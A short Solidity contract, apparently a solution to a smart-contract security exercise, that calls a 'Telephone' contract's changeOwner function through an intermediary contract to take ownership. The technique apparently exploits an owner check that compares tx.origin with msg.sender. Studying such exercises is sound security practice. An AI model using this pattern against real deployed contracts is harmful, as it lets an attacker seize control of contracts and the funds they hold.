// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./04-telephone.sol";

contract Attack04 {
    Telephone telephoneContract;

    constructor(address _telephoneContract) {
        telephoneContract = Telephone(_telephoneContract);
    }

    function attack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
